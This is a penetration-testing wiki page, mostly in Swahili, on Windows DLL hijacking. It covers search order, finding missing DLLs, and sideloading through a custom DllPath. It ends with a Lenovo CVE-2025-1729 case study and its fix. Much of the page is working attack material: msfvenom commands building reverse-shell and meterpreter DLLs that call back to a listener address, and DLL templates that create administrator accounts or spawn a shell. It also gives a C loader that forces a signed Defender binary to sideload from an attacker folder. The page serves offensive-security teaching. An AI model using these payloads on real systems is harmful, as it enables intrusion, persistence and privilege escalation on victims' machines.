# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kumfanya programu inayotambulika ianze kupakia DLL hatarishi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumiwa hasa kwa utekelezaji wa msimbo, kupata persistence, na, mara chache, kuongeza viwango vya ruhusa. Licha ya kuangazia escalation hapa, mbinu ya hijacking inabaki kuwa ile ile kwa malengo tofauti.

### Mbinu Zinazotumika Mara kwa Mara

Mbinu kadhaa zinatumiwa kwa DLL hijacking, kila moja ikiwa na ufanisi kulingana na mkakati wa programu wa kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halisi kwa moja hatarishi, kwa hiari kutumia DLL Proxying ili kuhifadhi utendakazi wa DLL asilia.
2. **DLL Search Order Hijacking**: Kuweka DLL hatarishi katika njia ya utafutaji kabla ya ile halali, ukitumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hatarishi ambayo programu itajaribu kupakia ikidhani ni DLL muhimu isiyokuwepo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama `%PATH%` au faili `.exe.manifest` / `.exe.local` kuelekeza programu kwa DLL hatarishi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali kwa mfano hatarishi katika saraka ya WinSxS, njia inayohusishwa mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hatarishi katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyokopiwa, inafanana na mbinu za Binary Proxy Execution.

## Kupata Dll zilizo Feli

Njia ya kawaida ya kupata Dll zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kuweka** **vichujio vifuatavyo 2**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na onyesha tu **Shughuli za Mfumo wa Faili**:

![](<../../../images/image (153).png>)

Ikiwa unatafuta **dll zilizo potea kwa ujumla** una **iacha** hili likiendesha kwa sekunde chache.\
Ikiwa unatafuta **dll iliyokosekana ndani ya executable maalum** unapaswa kuweka **kichujio kingine kama "Process Name" "contains" "\<exec name>", kuiendesha, na kusitisha kurekodi matukio**.

## Kutumia Dll zilizo Feli

Ili kuongeza viwango vya ruhusa, nafasi bora tunayo ni kuwa na uwezo wa **kuandika dll ambayo mchakato wenye ruhusa ataijaribu kupakia** mahali ambapo itaangaliwa. Kwa hivyo, tutaweza **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll asilia** iko (hali isiyo ya kawaida), au tutaweza **kuandika kwenye folda fulani ambapo dll itatafutwa** na dll asilia haitokuwepo katika folda yoyote.

### Dll Search Order

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi Dll zinavyopakuliwa hasa.**

Programu za Windows zinatafuta DLL kwa kufuata seti ya **njia za utafutaji zilizowekwa kabla**, zikifuata mpangilio maalum. Tatizo la DLL hijacking linapotokea ni pale DLL hatarishi inapowekwa kwa lengo katika moja ya saraka hizi, kuhakikisha inaanza kupakiwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia njia za kimsingi (absolute paths) inaporejea kwa DLL zinazohitajika.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit** hapa chini:

1. Saraka ambayo programu ilipakiwa kutoka.
2. Saraka ya mfumo. Tumia [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) ili kupata njia ya saraka hii.(_C:\Windows\System32_)
3. Saraka ya mfumo ya 16-bit. Hakuna kazi inayopatikana kupata njia ya saraka hii, lakini inatafutwa. (_C:\Windows\System_)
4. Saraka ya Windows. Tumia [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata njia ya saraka hii.
1. (_C:\Windows_)
5. Saraka ya sasa (current directory).
6. Saraka zilizoorodheshwa katika mabadiliko ya mazingira PATH. Kumbuka kuwa hili halijumuishi njia maalum kwa programu iliyobainishwa na ufunguo wa rejista **App Paths**. Ufunguzi wa **App Paths** hautumiki wakati wa kuhesabu njia ya utafutaji ya DLL.

Huo ndio mpangilio wa utafutaji wa **default** ukiwa na **SafeDllSearchMode** imewezeshwa. Wakati imezimwa saraka ya sasa inakaribia nafasi ya pili. Ili kuzima kipengele hiki, tengeneza thamani ya rejista **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (chaguo-msingi ni kuwezeshwa).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) inaitwa kwa **LOAD_WITH_ALTERED_SEARCH_PATH** utafutaji unaanza katika saraka ya module ya executable ambayo **LoadLibraryEx** inapakia.

Hatimaye, kumbuka kuwa **dll inaweza kupakiwa ikiwa imetajwa kwa njia kamili badala ya jina tu**. Katika hali hiyo dll hiyo **itaangaliwa tu katika njia hiyo** (ikiwa dll ina utegemezi wowote, zitatafutwa kama zilivyopakiwa kwa jina).

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji lakini sitaziweka hapa.

### Kuwezesha sideloading kwa kutumia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya juu zaidi ya kuathiri kwa uhakika njia ya utafutaji ya DLL ya mchakato mpya ulioundwa ni kuweka shamba DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda mchakato kwa kutumia native APIs za ntdll. Kwa kutoa saraka inayodhibitiwa na mshambuliaji hapa, mchakato lengwa ambao unatatua DLL iliyowasilishwa kwa jina (bila njia kamili na usingazi wa loading salama) unaweza kulazimishwa kupakia DLL hatarishi kutoka saraka hiyo.

Wazo kuu
- Jenga vigezo vya mchakato kwa RtlCreateProcessParametersEx na utoe DllPath maalum inayorejelea folda yako inayodhibitiwa (mfano, saraka ambapo dropper/unpacker wako iko).
- Unda mchakato kwa RtlCreateUserProcess. Wakati binary lengwa itatatua DLL kwa jina, loader itashauri DllPath uliotolewa wakati wa utatuzi, kuwezesha sideloading yenye uhakika hata wakati DLL hatarishi sio katika eneo moja na EXE lengwa.

Vidokezo/maana ya mipaka
- Hii inaathiri mchakato mtoto unaoundwa; ni tofauti na SetDllDirectory, ambayo inaathiri mchakato wa sasa pekee.
- Lengwa lazima aingize au aitumie LoadLibrary kwa DLL kwa jina (bila njia kamili na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na njia za kina zilizowekwa (hardcoded absolute paths) haiwezi kuhijacked. Forwarded exports na SxS yanaweza kubadilisha umiliki wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, uendeshaji makosa uliorahisishwa):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll iliyo na madhumuni mabaya (ikitoa functions zinazohitajika au ikifanya proxy kwa ile halisi) katika saraka yako ya DllPath.
- Anzisha binary iliyosainiwa inayojulikana kwamba inatafuta xmllite.dll kwa jina kwa kutumia mbinu iliyoelezewa hapo juu. Loader itatatua import kupitia DllPath iliyotolewa na kusideload DLL yako.

Mbinu hii imeonekana katika mazingira ya kweli kuendesha minyororo ya sideloading yenye hatua nyingi: launcher ya awali inaweka helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft, inayoweza kuibiwa, na DllPath maalum ili kulazimisha upakiaji wa DLL ya mshambulizi kutoka kwenye saraka ya staging.


#### Exceptions on DLL search order from Windows docs

Mambo machache ya kipekee kwenye mpangilio wa kawaida wa utafutaji wa DLL yaliyoainishwa katika nyaraka za Windows:

- Wakati **DLL ambayo inashiriki jina na ile tayari iliyopakiwa kwenye kumbukumbu** inapotambuliwa, mfumo hupita utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwa DLL iliyopo kwenye kumbukumbu. **Katika tukio hili, mfumo haufanyi utafutaji wa DLL**.
- Katika matukio ambapo DLL inatambulika kama **known DLL** kwa toleo la Windows linalotumika, mfumo utatumia toleo lake la known DLL, pamoja na DLL zote zinazotegemea, **bila kuendelea na mchakato wa utafutaji**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya known DLL hizi.
- Iwapo **DLL ina dependencies**, utafutaji wa DLL hizi tegemezi unafanywa kana kwamba zilielezwa tu kwa **module names**, bila kujali kama DLL ya awali ilitambuliwa kwa njia kamili au la.

### Kuongeza Ruhusa

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **different privileges** (horizontal or lateral movement), ambao **hukosa DLL**.
- Hakikisha upo **write access** kwa saraka yoyote ambayo **DLL** itatafutwa ndani yake. Mahali hapa inaweza kuwa saraka ya executable au saraka ndani ya system path.

Ndiyo, masharti ni magumu kuyapata kwa sababu **kwa chaguo-msingi ni kawaida kuwa vigumu kupata executable iliyo na ruhusa za juu ambayo inakosa dll** na ni hata **vilevile kuwa ajabu kuwa na ruhusa za kuandika kwenye saraka ya system path** (haziwezekani kwa chaguo-msingi). Lakini, katika mazingira yaliyo na mipangilio mibaya hii inawezekana.\
Ikiwa umepata bahati na unakutana na mahitaji hayo, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni kuzuia UAC**, unaweza kupata huko **PoC** ya Dll hijacking kwa toleo la Windows unalotumia ambayo unaweza kutumia (labda kwa kubadilisha tu njia ya folda ambapo una ruhusa za kuandika).

Kumbuka kwamba unaweza **kuangalia ruhusa zako kwenye saraka** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za kabrasha zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili wa jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa ya kuandika katika **System Path folder** angalia:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Zana za otomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itakagua kama una ruhusa za kuandika kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za kuvutia za otomatiki za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ikiwa utapata tukio linaloweza kutumika, mojawapo ya mambo muhimu zaidi ili kulifanyia exploit kwa mafanikio ni **create a dll that exports at least all the functions the executable will import from it**. Vilevile, kumbuka kuwa Dll Hijacking inaweza kuwa muhimu kwa ajili ya [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **how to create a valid dll** ndani ya utafiti huu wa dll hijacking uliolenga dll hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **next section** utaona baadhi ya **basic dll codes** ambazo zinaweza kuwa za msaada kama **templates** au kuunda **dll with non required functions exported**.

## **Kuunda na kukusanya Dlls**

### **Dll Proxifying**

Kwa msingi, **Dll proxy** ni Dll inayoweza **execute your malicious code when loaded** lakini pia **kuonyesha** na **kufanya kazi** kama ilivyotarajiwa kwa **relay all the calls to the real library**.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kuteua executable na kuchagua library unayotaka proxify na **generate a proxified dll** au **kuteua Dll** na **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 — sikuwona toleo la x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika kesi kadhaa Dll unayoi-compile lazima **export several functions** ambazo zitatumika na victim process, ikiwa functions hizi hazipo, the **binary won't be able to load** them na the **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Somo la Kesi: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Kesi hii inaonyesha Phantom DLL Hijacking katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.

### Maelezo ya Udhaifu

- **Komponenti**: `TPQMAssistant.exe` iko kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Kazi Iliyopangwa**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inaendesha kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Saraka**: Inaweza kuandikwa na `CREATOR OWNER`, ikiruhusu watumiaji wa ndani kuweka faili za aina yoyote.
- **Tabia ya Utafutaji wa DLL**: Inajaribu kupakia `hostfxr.dll` kutoka saraka ya kazi kwanza na inarekodi "NAME NOT FOUND" ikiwa haipo, ikionyesha kuwa utafutaji wa saraka ya ndani unaoanza kwanza.

### Utekelezaji wa Exploit

Mshambulizi anaweza kuweka stub ya `hostfxr.dll` yenye madhara katika saraka ile ile, akitumia DLL iliyokosekana ili kupata utekelezaji wa msimbo chini ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa iendeshwe saa 9:30 AM kwa muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati kazi inatekelezwa, DLL hasidi itaendesha katika kikao cha msimamizi kwa medium integrity.
4. Tumia mnyororo wa mbinu za kawaida za UAC bypass ili kuinua kutoka medium integrity hadi vibali vya SYSTEM.

### Kupunguza hatari

Lenovo ilitoa toleo la UWP **1.12.54.0** kupitia Microsoft Store, ambalo linasakinisha TPQMAssistant kwenye `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, linaondoa kazi iliyokuwa hatarini, na linaficha/linafuta vipengele vya zamani vya Win32.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
